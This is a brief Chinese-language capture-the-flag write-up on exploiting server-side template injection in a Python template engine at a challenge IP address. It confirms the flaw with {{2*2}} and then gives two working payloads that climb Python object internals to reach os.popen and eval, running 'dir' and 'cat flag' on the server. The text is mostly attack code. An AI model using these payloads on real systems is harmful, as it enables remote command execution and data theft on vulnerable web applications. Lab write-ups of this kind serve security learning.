验证是否存在ssti

http://114.67.175.224:10168/?flag={{2*2}}
回显为4，存在漏洞

测试
```
{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('dir').read()%}{%endif%}{%endfor%}
```


测试payload
```
{{config.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")}}
```
后得到flag